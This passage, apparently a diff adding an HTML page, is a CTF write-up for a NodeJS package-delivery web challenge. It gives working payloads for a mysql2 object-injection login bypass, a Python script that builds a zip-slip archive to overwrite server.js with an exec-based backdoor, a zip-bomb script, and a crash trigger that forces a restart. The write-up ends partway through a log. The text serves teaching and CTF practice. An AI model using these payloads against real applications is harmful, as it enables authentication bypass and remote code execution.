@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="challenge-details">Challenge details</h4>
+<table>
+<thead>
+<tr>
+<th><strong>Category</strong></th>
+<th>Web</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Standalone</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>Dynamic</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td>Unsolved</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>6/10</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>I wasn't able to complete this challenge during the actual CTF because of the holidays, but I still wanted to write a writeup on it because it ended up being extremely interesting. We're faced with a NodeJS application that handles the assignment and delivery of Christmas packages :</p>
+<pre class="codehilite"><code>├── app
+│   ├── controllers
+│   │   ├── adminController.js
+│   │   ├── apiController.js
+│   │   ├── authController.js
+│   │   ├── fileController.js
+│   │   ├── publicController.js
+│   │   └── userController.js
+│   ├── data
+│   │   └── packages
+│   │       ├── clarion.json
+│   │       ├── fawn.json
+│   │       ├── iridessa.json
+│   │       ├── nyx.json
+│   │       ├── periwinkle.json
+│   │       ├── rosetta.json
+│   │       ├── silvermist.json
+│   │       ├── tinkerbell.json
+│   │       ├── vidia.json
+│   │       └── zarina.json
+│   ├── init-db.js
+│   ├── models
+│   │   ├── mysqldb.js
+│   │   ├── Package.js
+│   │   ├── Recipient.js
+│   │   └── User.js
+│   ├── package.json
+│   ├── public
+│   │   ├── css
+│   │   │   ├── package-detail.css
+│   │   │   └── style.css
+│   │   ├── images
+│   │   │   ├── command-center.png
+│   │   │   ├── sleigh-hangar.png
+│   │   │   ├── tinselwick-portal.png
+│   │   │   └── tinselwick-village.png
+│   │   └── js
+│   │       ├── 404.js
+│   │       ├── admin-dashboard.js
+│   │       ├── admin-package-detail.js
+│   │       ├── admin-package-map.js
+│   │       ├── admin-pilot-detail.js
+│   │       ├── admin-pilots.js
+│   │       ├── admin-recipient-management.js
+│   │       ├── admin-recipients.js
+│   │       ├── auth.js
+│   │       ├── index.js
+│   │       ├── login.js
+│   │       ├── user-dashboard.js
+│   │       ├── user-package-detail.js
+│   │       ├── user-packages.js
+│   │       └── utils.js
+│   ├── routes
+│   │   └── index.js
+│   ├── server.js
+│   ├── utils
+│   │   └── zipParser.js
+│   └── views
+│       ├── 404.html
+│       ├── admin
+│       │   ├── dashboard.html
+│       │   ├── package-detail.html
+│       │   ├── pilot-detail.html
+│       │   ├── pilots.html
+│       │   ├── recipient-management.html
+│       │   └── recipients-delete.html
+│       ├── index.html
+│       ├── login.html
+│       └── user
+│           ├── dashboard.html
+│           ├── package-detail.html
+│           └── packages.html
+├── build.sh
+├── config
+│   ├── nginx.conf
+│   └── supervisord.conf
+├── docker-compose.yml
+├── Dockerfile
+├── entrypoint.sh
+├── flag.txt
+└── readflag.c
+</code></pre>
+
+<p>The flag is placed inside the <code>/root</code> directory and given the appropriate permissions. The <code>/readflag</code> is given the sticky bit <code>+s</code>, meaning its execution is the only way to obtain the flag. We'll need RCE to solve this challenge.</p>
+<p><code>Supervisord</code> is executed inside the entrypoint script to manage all components of the app.</p>
+<h4 id="source-code-analysis">Source code analysis</h4>
+<p>Here are the main endpoints of the application and their corresponding functions :</p>
+<pre class="codehilite"><code class="language-js">// PUBLIC ROUTES
+router.get('/', publicController.getIndex);
+router.get('/login', authController.getLogin);
+router.post('/login', authController.postLogin);
+router.get('/logout', authController.logout);
+router.get('/api/user', apiController.getCurrentUser);
+router.get('/api/public-stats', apiController.getPublicStats);
+
+// USER-LEVEL
+router.get('/api/user/dashboard-data', authController.requireAuth, authController.requireUser, apiController.getUserDashboardData);
+router.get('/api/user/packages-data', authController.requireAuth, authController.requireUser, apiController.getUserPackagesData);
+router.get('/api/user/package/:recipient', authController.requireAuth, authController.requireUser, apiController.getPackageDetailData);
+router.get('/user/dashboard', authController.requireAuth, authController.requireUser, userController.getDashboard);
+router.get('/user/packages', authController.requireAuth, authController.requireUser, userController.getPackages);
+router.post('/user/packages/pickup', authController.requireAuth, authController.requireUser, userController.pickupPackage);
+router.get('/user/package/:recipient', authController.requireAuth, authController.requireUser, fileController.viewPackage);
+router.get('/user/packages/:recipient/download', authController.requireAuth, authController.requireUser, fileController.downloadAttachment);
+
+// ADMIN-LEVEL
+router.get('/api/admin/dashboard-data', authController.requireAuth, authController.requireAdmin, apiController.getAdminDashboardData);
+router.get('/api/admin/recipients-data', authController.requireAuth, authController.requireAdmin, apiController.getRecipientsData);
+router.get('/api/admin/pilots-data', authController.requireAuth, authController.requireAdmin, apiController.getPilotsData);
+router.get('/api/admin/pilot/:username', authController.requireAuth, authController.requireAdmin, apiController.getPilotDetailData);
+router.get('/api/admin/package/:recipient', authController.requireAuth, authController.requireAdmin, apiController.getAdminPackageDetailData);
+router.get('/admin/dashboard', authController.requireAuth, authController.requireAdmin, adminController.getDashboard);
+router.get('/admin/recipient-management', authController.requireAuth, authController.requireAdmin, adminController.getRecipientManagement);
+router.post('/admin/recipient-management/create', authController.requireAuth, authController.requireAdmin, adminController.createRecipient);
+router.get('/admin/pilots', authController.requireAuth, authController.requireAdmin, adminController.getPilots);
+router.get('/admin/pilots/:username', authController.requireAuth, authController.requireAdmin, adminController.getPilotDetail);
+router.get('/admin/recipients/:recipient', authController.requireAuth, authController.requireAdmin, adminController.getPackageDetail);
+router.post('/admin/recipients/:recipient/create-package', authController.requireAuth, authController.requireAdmin, adminController.createPackageFromForm);
+router.post('/admin/recipients/:recipient/upload', authController.requireAuth, authController.requireAdmin, upload.array('files'), adminController.uploadFiles);
+router.post('/admin/recipients/:recipient/assign', authController.requireAuth, authController.requireAdmin, adminController.assignPackage);
+</code></pre>
+
+<p>There's a lot of source code, but the application is pretty simple : Users with the <code>pilot</code> role can pick up various packages that need to be delivered. Once they do, users can see information belonging to this package as well as download and read their attachement files. Admin users can create new recipients for these packages, create new packages, upload attachements files and assign packages to pilots directly.  </p>
+<h4 id="authentication-bypass">Authentication bypass</h4>
+<p>First, we need a valid account to unlock any functionnality, meaning the only thing we can really do is look at the login page to find any possible vulnerabilities that exist within its implementation (<code>controllers/authController.js</code>) :</p>
+<pre class="codehilite"><code class="language-js">exports.postLogin = async (req, res) =&gt; {
+    const { username, password } = req.body;
+
+    if (username &amp;&amp; password) {
+        try {
+            const results = await query(
+                'SELECT * FROM users WHERE username = ? AND password = ?',
+                [username, password]
+            );
+
+            if (results.length &gt; 0) {
+                const user = results[0];
+
+                req.session.userId = user.id;
+                req.session.username = user.username;
+                req.session.role = user.role;
+
+                if (user.role === 'admin') {
+                    return res.redirect('/admin/dashboard');
+                } else {
+                    return res.redirect('/user/dashboard');
+                }
+            } else {
+                return res.status(401).json({
+                    error: 'Incorrect Username and/or Password!'
+                });
+            }
+        } catch (error) {
+            console.error('Login error:', error);
+            return res.status(500).json({
+                error: 'Login failed. Please try again.'
+            });
+        }
+    } else {
+        return res.status(400).json({
+            error: 'Please enter Username and Password!'
+        });
+    }
+};
+</code></pre>
+
+<p>The MySQL implementation looks normal as well :</p>
+<pre class="codehilite"><code class="language-js">const mysql = require('mysql2/promise');
+
+const dbConfig = {
+    host: process.env.DB_HOST || '127.0.0.1',
+    user: process.env.DB_USER || 'root',
+    password: process.env.DB_PASSWORD || '',
+    database: process.env.DB_NAME || 'peppermintroute',
+    waitForConnections: true,
+    connectionLimit: 10,
+    queueLimit: 50, 
+    connectTimeout: 10000
+};
+
+let pool;
+
+function getPool() {
+    if (!pool) {
+        pool = mysql.createPool(dbConfig);
+    }
+    return pool;
+}
+
+async function query(sql, params) {
+    const connection = await getPool().getConnection();
+    try {
+        const [results] = await connection.query(sql, params);
+        return results;
+    } finally {
+        connection.release();
+    }
+}
+
+module.exports = { getPool, query };
+</code></pre>
+
+<p>While searching for <code>mysql2</code> login bypasses in NodeJs, I came across <a href="https://ian.nl/blog/nodejs-prepstmnt-bypass-to-rce.">this</a> blog page, which showcases a way MySQL clients can be vulnerable to injection even after the uses of prepared statements in NodeJS. The idea is that some clients handle objects in prepared satements because it allows for a very convenient shorthand for <code>INSERT</code> or <code>UPDATE</code> statements. An object passed to the client like this :</p>
+<pre class="codehilite"><code class="language-json">{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;password&quot;: 1}}
+</code></pre>
+
+<p>Can be resolved into the following SQL query :</p>
+<pre class="codehilite"><code class="language-sql">SELECT username FROM users 
+WHERE username = 'admin' AND password = (password = 1)
+</code></pre>
+
+<p>The expression <code>password = 1</code> is evaluated as <code>True</code> (since <code>1</code> is a thruthy value), so the SQL statement ends up always making the result <code>True</code> :</p>
+<pre class="codehilite"><code class="language-SQL">SELECT username FROM users 
+WHERE username = 'admin' AND password = 1
+</code></pre>
+
+<p>Since we don't have any known user to login into, we can simply also skip the username to be logged in into the first user in the database :</p>
+<pre class="codehilite"><code class="language-json">{&quot;username&quot;: {&quot;username&quot;: 1}, &quot;password&quot;: {&quot;password&quot;: 1}}
+</code></pre>
+
+<p>Since the application enabled extended parsing, we can also create objects out of URL encoded data :</p>
+<pre class="codehilite"><code>username[username]=1&amp;password[password]=1
+</code></pre>
+
+<p>If we modify the login request, we'll actually get logged in as admin :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/9b9886d01b0da06c329dd62c79d78e37e69e7694/uploads/2026-01-06T20-41-27-850Z-66uh05a66.png" /></p>
+<p>Now we have to face both user and admin endpoints to find our next vulnerabilities. A good start would be the suspicious custom zip parser in <code>utils/zipParser.js</code> used when an administrator uploads a file attachement to a package. The parser will accept zip archives to be uploaded and will attempt to extract the files inside to be used as attachements (<code>controllers/adminController.js</code>). A random ID and a database entry into the <code>file_attachments</code> table is made for each file found in the archive :</p>
+<pre class="codehilite"><code class="language-js">exports.uploadFiles = async (req, res) =&gt; {
+    try {
+        const { recipient } = req.params;
+
+        if (!req.files || req.files.length === 0) {
+            return res.status(400).send('No files uploaded');
+        }
+
+        const recipientExists = await Recipient.exists(recipient);
+        if (!recipientExists) {
+            return res.status(404).send('Recipient not found. Please create the recipient first.');
+        }
+
+        for (const file of req.files) {
+            if (file.originalname.endsWith('.zip')) {
+                try {
+                    const zipPath = file.path;
+                    const extractDir = path.dirname(zipPath);
+                    const parser = new ZipParser(zipPath);
+                    const extractedFiles = parser.extractAll(extractDir);
+
+                    for (const filePath of extractedFiles) {
+                        const fileName = path.basename(filePath);
+                        const fileId = crypto.randomBytes(16).toString('hex');
+
+                        await query(
+                            `REPLACE INTO file_attachments (file_id, recipient, filename, filepath)
+                                VALUES (?, ?, ?, ?)`,
+                            [fileId, recipient, fileName, filePath]
+                        );
+
+                    }
+
+                    fs.unlinkSync(zipPath);
+                } catch (error) {
+                    console.error(`Error extracting ZIP ${file.originalname}:`, error);
+                }
+            } else {
+                await query(
+                    `REPLACE INTO file_attachments (file_id, recipient, filename, filepath)
+                     VALUES (?, ?, ?, ?)`,
+                    [file.fileId, recipient, file.filename, file.path]
+                );
+
+            }
+        }
+
+        res.redirect(`/admin/recipients/${recipient}`);
+    } catch (error) {
+        console.error('Upload files error:', error);
+        res.status(500).send('Error uploading files: ' + error.message);
+    }
+};
+</code></pre>
+
+<p><code>Multer</code> middleware is used for file uploads, where files are limited to a certain filesize and are uploaded into the directory created for the specific recipient included as a parameter in the URL (<code>routes/index.js</code>) :</p>
+<pre class="codehilite"><code class="language-js">const storage = multer.diskStorage({
+    destination: async function (req, file, cb) {
+
+        let uploadPath;
+
+        if (req.params &amp;&amp; req.params.recipient) {
+            const recipientDir = await Recipient.getDirectory(req.params.recipient);
+            if (recipientDir) {
+                uploadPath = recipientDir;
+            } else {
+                return cb(new Error('Recipient not found'));
+            }
+        } 
+
+        if (!fs.existsSync(uploadPath)) {
+            fs.mkdirSync(uploadPath, { recursive: true });
+        }
+
+        cb(null, uploadPath);
+    },
+    filename: function (_req, file, cb) {
+        const fileId = crypto.randomBytes(16).toString('hex');
+        file.fileId = fileId;
+        cb(null, file.originalname);
+    }
+});
+
+const upload = multer({
+    storage: storage,
+    limits: {
+        fileSize: 10 * 1024 * 1024,
+        files: 10
+    },
+    fileFilter: function(req, file, cb) {
+        cb(null, true);
+    }
+});
+</code></pre>
+
+<h4 id="path-traversal-in-the-zip-parser">Path Traversal in the zip parser</h4>
+<p>The first thought I had was to find a way to overwrite backend NodeJS files with the zip extraction for RCE. While sifting through the source code in <code>utils/zipParser.js</code>, we can find a pretty obvious problem with the way files are unzipped and written to disk :</p>
+<pre class="codehilite"><code class="language-js">extractAll(destDir) {
+    const entries = this.findEntries();
+    const extractedFiles = [];
+
+    for (const entry of entries) {
+        try {
+            // Prevent deeply nested directory structures
+            const parts = entry.fileName.split('/').filter(p =&gt; p);
+            if (parts.length &gt; 4) {
+                console.error(`Path too deep: ${entry.fileName}`);
+                continue;
+            }
+            // Creates full path of written file by joining an existing dir to our filename
+            const fullPath = path.join(destDir, entry.fileName);
+
+            const dir = path.dirname(fullPath);
+            if (!fs.existsSync(dir)) {
+                fs.mkdirSync(dir, { recursive: true });
+            }
+
+            const fileData = this.buffer.slice(entry.dataOffset, entry.dataEnd);
+
+            let content;
+            if (entry.compression === 0) {
+                content = fileData;
+            } else if (entry.compression === 8) {
+
+                try {
+                    content = zlib.inflateRawSync(fileData);
+                } catch (e) {
+                    console.error(`Failed to decompress ${entry.fileName}: ${e.message}`);
+                    continue;
+                }
+            } else {
+                console.error(`Unsupported compression method ${entry.compression} for ${entry.fileName}`);
+                continue;
+            }
+            // Write directly into this full path with almost no validation on path traversal except the amount of slashes
+            extractedFiles.push(fullPath);
+            fs.writeFileSync(fullPath, content);
+
+
+        } catch (e) {
+            console.error(`Error extracting ${entry.fileName}: ${e.message}`);
+        }
+    }
+
+    return extractedFiles;
+}
+</code></pre>
+
+<p>The parser only prevents files with more than 4 slashes in their name to be extracted and created on disk. Since the file upload directory is <code>/app/data/uploads/&lt;id&gt;</code> inside the container (defined inside the Db initialization script <code>init-db.js</code>), we can construct an archive with a file that goes back 3 directories (into <code>/app</code>) and overwrite the <code>server.js</code> main backend file :</p>
+<pre class="codehilite"><code class="language-python">import zipfile
+
+with zipfile.ZipFile(&quot;payload.zip&quot;, &quot;w&quot;, zipfile.ZIP_DEFLATED) as z:
+    z.write(&quot;server.js&quot;, arcname=&quot;../../../server.js&quot;)
+
+print(&quot;ZIP created&quot;)
+</code></pre>
+
+<p>To execute system code, we can simply modify the way the existing app handles serving non-existant pages to keep functionnality. Our backdoor will execute the <code>/readflag</code> binary when a non-existing endpoint is visited instead of loading an HTML template :</p>
+<pre class="codehilite"><code class="language-js">const express = require('express');
+const session = require('express-session');
+const bodyParser = require('body-parser');
+const path = require('path');
+const crypto = require('crypto');
+const routes = require('./routes');
+const { exec } = require('child_process'); // We now import this
+
+
+const app = express();
+const PORT = 3000;
+
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+
+app.use(session({
+    secret: crypto.randomBytes(32).toString('hex'),
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+        httpOnly: true,
+        maxAge: 24 * 60 * 60 * 1000
+    }
+}));
+
+
+app.use('/', routes);
+// Changed section to execute system commands
+app.use((req, res) =&gt; {
+    exec('/readflag', (error, stdout, stderr) =&gt; {
+        if (error) {
+            return res.status(500).send(error.message);
+        }
+
+        if (stderr) {
+            return res.status(500).send(stderr);
+        }
+
+        res.status(404).type('text/plain').send(stdout);
+    });
+});
+
+app.use((err, req, res, next) =&gt; {
+    console.error(err.stack);
+    res.status(500).send('Something went wrong!');
+});
+
+app.listen(PORT, '127.0.0.1', () =&gt; {
+    console.log(`[Server] PeppermintRoute running on http://127.0.0.1:${PORT}`);
+});
+</code></pre>
+
+<p>If we upload this crafted zip file as a attachement for any package, we'll see that the <code>server.js</code> file was indeed overwritten in our local docker setup :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/CTF/htb]
+└─$ docker exec -it peppermintroute /bin/bash
+root@6f4306005f7a:/app# ls -la
+total 112
+drwxr-xr-x 1 ctf  ctf   4096 Dec 22 17:58 .
+drwxr-xr-x 1 root root  4096 Dec 23 01:49 ..
+drwxrwxrwx 1 ctf  ctf   4096 Dec 22 17:58 controllers
+drwxrwxrwx 1 ctf  ctf   4096 Dec 23 01:50 data
+-rwxrwxrwx 1 ctf  ctf  11478 Dec 15 18:35 init-db.js
+drwxr-xr-x 1 ctf  ctf   4096 Dec 20 03:26 logs
+drwxrwxrwx 1 ctf  ctf   4096 Dec 15 18:35 models
+drwxr-xr-x 1 ctf  ctf   4096 Dec 22 17:58 node_modules
+-rw-r--r-- 1 ctf  ctf  43093 Dec 22 17:58 package-lock.json
+-rwxrwxrwx 1 ctf  ctf    402 Dec 15 18:35 package.json
+drwxrwxrwx 1 ctf  ctf   4096 Dec 15 18:35 public
+drwxrwxrwx 1 ctf  ctf   4096 Dec 15 18:35 routes
+-rwxrwxrwx 1 ctf  ctf   1270 Dec 23 02:19 server.js
+drwxrwxrwx 1 ctf  ctf   4096 Dec 15 18:35 utils
+drwxrwxrwx 1 ctf  ctf   4096 Dec 15 18:35 views
+root@6f4306005f7a:/app# cat server.js 
+const express = require('express');
+const session = require('express-session');
+const bodyParser = require('body-parser');
+const path = require('path');
+const crypto = require('crypto');
+const routes = require('./routes');
+const { exec } = require('child_process');
+
+
+const app = express();
+const PORT = 3000;
+
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+
+app.use(session({
+    secret: crypto.randomBytes(32).toString('hex'),
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+        httpOnly: true,
+        maxAge: 24 * 60 * 60 * 1000
+    }
+}));
+
+
+app.use('/', routes);
+
+app.use((req, res) =&gt; {
+    exec('/readflag', (error, stdout, stderr) =&gt; {
+        if (error) {
+            return res.status(500).send(error.message);
+        }
+
+        if (stderr) {
+            return res.status(500).send(stderr);
+        }
+
+        res.status(404).type('text/plain').send(stdout);
+    });
+});
+
+app.use((err, req, res, next) =&gt; {
+    console.error(err.stack);
+    res.status(500).send('Something went wrong!');
+});
+
+app.listen(PORT, '127.0.0.1', () =&gt; {
+    console.log(`[Server] PeppermintRoute running on http://127.0.0.1:${PORT}`);
+});
+</code></pre>
+
+<p>This is great, but even though our changes were made we still need a way to reload the app for our backdoor to take effect. From what I can see, NodeJS doesn't have a debug mode like Flask that can automatically restart the app by detecting file changes. </p>
+<p>Instead, we can look at what's responsible for running the NodeJS process, <code>supervisord</code>. Looking at the configuration file inside the <code>config</code> directory, we can see that the <code>autorestart</code> option is set to <code>true</code> :</p>
+<pre class="codehilite"><code>[program:nodejs]
+command=/usr/local/bin/node /app/server.js
+directory=/app
+autostart=true
+autorestart=true
+user=ctf
+stdout_logfile=/dev/stdout
+stdout_logfile_maxbytes=0
+stderr_logfile=/dev/stderr
+stderr_logfile_maxbytes=0
+redirect_stderr=true
+environment=NODE_ENV=&quot;production&quot;,DB_HOST=&quot;127.0.0.1&quot;,DB_USER=&quot;root&quot;,DB_PASSWORD=&quot;&quot;,DB_NAME=&quot;peppermintroute&quot;
+priority=3
+startsecs=10
+</code></pre>
+
+<p>This means that the NodeJS process running the app is automatically restarted if it ever crashes. This means all we need to do is crash the app through an error for our backdoor to take effect after the reload to solve the challenge. Easy enough, right?</p>
+<h4 id="crashing-the-damn-application">Crashing the damn application</h4>
+<p>How do we approach such a challenge? All endpoint handlers and database operations use some sort of error handling which would stop the process from crashing via <code>try/catch</code> statements. At first, I was convinced an error inside the parser would need to be abused in order to make the crash happen. The most logical thing would be to find a way to consume all ressources available so that the JavaScript heap runs out of memory, causing a fatal error. </p>
+<p>I first thing I thought of was to upload a ginormous zip archive to the application such that the resources available would be entirely consumed during the file extraction, but Nginx (also launched by <code>supervisord</code>) seems to implement a maximum possible file upload size of around 2MB, stopping us in our tracks :</p>
+<pre class="codehilite"><code>Status Code: 413
+Response: &lt;html&gt;
+&lt;head&gt;&lt;title&gt;413 Request Entity Too Large&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;413 Request Entity Too Large&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Next, I thought about making a zip bomb that would have an initial file size of under 2MB but when extracted much bigger. Gemini cooked up this script, which created a file of around 200MB when extracted :</p>
+<pre class="codehilite"><code class="language-python">import zipfile
+import io
+
+def create_small_zip_bomb(filename):
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
+        content = b'\0' * (1024 * 1024 * 200) # 200MB chunk
+        zf.writestr('bomb.txt', content)
+
+    with open(filename, 'wb') as f:
+        f.write(buf.getvalue())
+
+create_small_zip_bomb('tiny_bomb.zip')
+</code></pre>
+
+<p>I hoped that this file would be enough in consuming all resources when extracting, but I never got it working whilst staying under the filesize limit. The zip parser also doesn't recursively unzip the files inside, which limits the amount of data we can compress in our bomb. </p>
+<p>My next idea was to just upload a bunch of files like this in succession so that the parser doesn't have time to clear memory for the next zip file. I couldn't get this to work either. At this point, I gave up on this approach and looked for other options.</p>
+<p>What else can we do here? Could there still be ways of causing fatal errors despite having error handling with <code>try/catch</code>? ChatGPT ended up being clutch and revealed another possibility :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/5456deea1a77725bdd6aa71d39035d8e44cbc722/uploads/2026-01-06T20-44-11-467Z-wjis84va6.png" /></p>
+<p>I really should've considered this sooner. Asynchronous code will store code to run later and represent values that exist in the future (either pending, fulfilled or rejected). When the function is ran in the future, it runs on a different call stack then the original code that created it. If an errors occurs in future execution, the <code>try/catch</code> block will have already executed, meaning our error won't be handled by it, crashing the process! </p>
+<p>So how can we search find asynchronous functions in the source code? We can look for <code>await</code> and <code>async</code> keywords, but I wasn't able to find a way to make any of them crash (most of them involve DB operations). Instead, we can also classify which functions might be asynchronous based on what they're meant to do. Thanks again to ChatGPT : 
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/096b19689697cf5957b53addd00e308100f05e67/uploads/2026-01-06T20-46-19-516Z-s8ur5mblw.jpg" /></p>
+<p>After a bit of smart searching, we find the potentially interesting asyncronous function <code>fs.createReadStream</code> inside the <code>fileController.js</code> file, used when pilots download the file attachements belonging to their packages : </p>
+<pre class="codehilite"><code class="language-js">exports.downloadAttachment = async (req, res) =&gt; {
+    try {
+        const { fileId } = req.query;
+
+        if (!fileId) {
+            return res.status(400).json({ error: 'fileId is required' });
+        }
+
+        const fileRecord = await Package.getFileById(fileId);
+
+        if (!fileRecord) {
+            return res.status(404).json({ error: 'File not found' });
+        }
+
+        const packageResults = await query(
+            'SELECT assigned_to FROM packages WHERE recipient = ?',
+            [fileRecord.recipient]
+        );
+
+        if (!packageResults || packageResults.length === 0) {
+            return res.status(404).json({ error: 'Package not found' });
+        }
+
+        if (packageResults[0].assigned_to !== req.session.username) {
+            return res.status(403).json({ error: 'Access denied: This file is not assigned to you' });
+        }
+
+        const filePath = fileRecord.filepath;
+        const resolvedFilePath = path.resolve(filePath);
+        const uploadsDir = path.resolve('/app/data/uploads');
+
+        if (!resolvedFilePath.startsWith(uploadsDir + path.sep)) {
+            return res.status(403).json({ error: 'Access denied: Invalid file location' });
+        }
+
+        res.setHeader('Content-Disposition', `attachment; filename=&quot;${fileRecord.filename}&quot;`);
+        res.setHeader('Content-Type', 'application/octet-stream');
+        // Here!
+        const fileStream = fs.createReadStream(filePath);
+        fileStream.pipe(res);
+    } catch (error) {
+        console.error('Download error:', error);
+        res.status(500).json({ error: 'Error downloading file' });
+    }
+};
+</code></pre>
+
+<p>What if we pointed the <code>createReadStream</code> function towards a file that didn't exist? Would this cause an error after the <code>try/catch</code> block? The only problem with this approach is that the file needs to be inside the <code>/app/data/uploads/</code> directory and the entry needs to exist in the database. The only way this happens is when files are actually uploaded as attachements.</p>
+<p>So how do we include something that doesn't technically exist in the eyes of <code>createReadStream</code> within our zip file but still gets an entry created in the database? If we look at the zip parser again, we'll see that it uses the following function to find existing files by extracting file header signatures :</p>
+<pre class="codehilite"><code class="language-js">parseLocalFileHeader(offset) {
+    try {
+        const signature = this.buffer.readUInt32LE(offset);
+        if (signature !== 0x04034b50) return null;
+
+        const version = this.buffer.readUInt16LE(offset + 4);
+        const flags = this.buffer.readUInt16LE(offset + 6);
+        const compression = this.buffer.readUInt16LE(offset + 8);
+        const fileNameLength = this.buffer.readUInt16LE(offset + 26);
+        const extraFieldLength = this.buffer.readUInt16LE(offset + 28);
+        const compressedSize = this.buffer.readUInt32LE(offset + 18);
+
+        const fileNameStart = offset + 30;
+        const fileName = this.buffer.toString('utf8', fileNameStart, fileNameStart + fileNameLength);
+
+        const dataOffset = offset + 30 + fileNameLength + extraFieldLength;
+        const dataEnd = dataOffset + compressedSize;
+
+        return {
+            fileName: fileName,
+            compression: compression,
+            compressedSize: compressedSize,
+            dataOffset: dataOffset,
+            dataEnd: dataEnd,
+            nextOffset: dataEnd
+        };
+    } catch (e) {
+        return null;
+    }
+}
+</code></pre>
+
+<p>However, it never attempts to differentiate standard files from directories by checking the file names for the presence of slashes. In the extraction, the parser will simply take the current directory the file is in and create it if it doesn't exist.</p>
+<p>This is a lot of information, so let's recap all of our observations so far :</p>
+<ul>
+<li>The parser doesn't differentiate between files and directories by checking the filenames</li>
+<li>The parser grabs the directory of the file name with <code>path.dirname</code> and creates it if it doesn't already exist</li>
+<li>The filename gets pushed into the list of extracted files and gets added into the DB</li>
+<li>The parser finally grabs the full path of the filename and attempts to create the file</li>
+</ul>
+<p>All of these point to one solution : an empty directory. If we feed an emtpy directory to <code>path.dirname</code>, for example <code>/app/data/uploads/&lt;id&gt;/empty/</code>, the result will still be <code>/app/data/uploads/&lt;id&gt;/</code>, meaning no directory is created. Then, the full path, now pointing to a non-existing directory, is inserted into the DB as an existing file before the file is even attempted to be created, which will cause the following handled error :</p>
+<pre class="codehilite"><code>peppermintroute  | Error extracting empty/: EISDIR: illegal operation on a directory, open '/app/data/uploads/8ccd74061453c353e39585205590835e/empty/'
+</code></pre>
+
+<p>We can add a new empty directory from a string inside our zip archive :</p>
+<pre class="codehilite"><code class="language-python">import zipfile
+
+with zipfile.ZipFile(&quot;payload.zip&quot;, &quot;w&quot;, zipfile.ZIP_DEFLATED) as z:
+    z.write(&quot;server.js&quot;, arcname=&quot;../../../server.js&quot;)
+    z.writestr(&quot;empty/&quot;, &quot;&quot;)
+
+print(&quot;ZIP created&quot;)
+</code></pre>
+
+<p>When we upload this new zip file, we'll see that the app successfully added the non-existing directory as a file we can read from :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/7665d8a83202ae9b899c8d8965b2292548e64338/uploads/2026-01-06T20-47-52-714Z-or77k5agk.png" /></p>
+<p>Now, all we have to do is assign the package to a pilot of our choice :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/7ffa7a4b6b9dc013a35650200a5a857e960be98b/uploads/2026-01-06T20-48-14-105Z-abvreo64n.png" /></p>
+<p>We can login into this account with the SQLi vulnerability discovered earlier using the pilot's username which we can now see as admin :</p>
+<pre class="codehilite"><code>username[username]=pilot_aurora_&lt;id&gt;&amp;password[password]=1
+</code></pre>
+
+<p>If we select this package we'll see the option to download the empty file :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/480c75cd9c7e864c0b1be6258e06407c7d4da263/uploads/2026-01-06T20-48-31-331Z-adm1gh4pp.png" /></p>
+<p>After the attempted download, we should see an unhandled error in the docker logs and the app restart :</p>
+<pre class="codehilite"><code>peppermintroute  | Error extracting empty/: EISDIR: illegal operation on a directory, open '/app/data/uploads/8ccd74061453c353e39585205590835e/empty/'
+peppermintroute  | [SERVER] Returning location for zarina: lat=59.91390000, lon=10.75220000
+peppermintroute  | [SERVER] Returning location for clarion: lat=55.95330000, lon=-3.18830000
+peppermintroute  | [SERVER] Returning location for fawn: lat=48.85660000, lon=2.35220000
+peppermintroute  | [SERVER] Returning location for iridessa: lat=60.16950000, lon=24.93540000
+peppermintroute  | [SERVER] Returning location for nyx: lat=53.34980000, lon=-6.26030000
+peppermintroute  | [SERVER] Returning location for periwinkle: lat=55.67610000, lon=12.56830000
+peppermintroute  | [SERVER] Returning location for rosetta: lat=64.14660000, lon=-21.94260000
+peppermintroute  | [SERVER] Returning location for silvermist: lat=45.42150000, lon=-75.69720000
+peppermintroute  | [SERVER] Returning location for tinkerbell: lat=51.50740000, lon=-0.12780000
+peppermintroute  | [SERVER] Returning location for vidia: lat=59.32930000, lon=18.06860000
+peppermintroute  | node:events:486
+peppermintroute  |       throw er; // Unhandled 'error' event
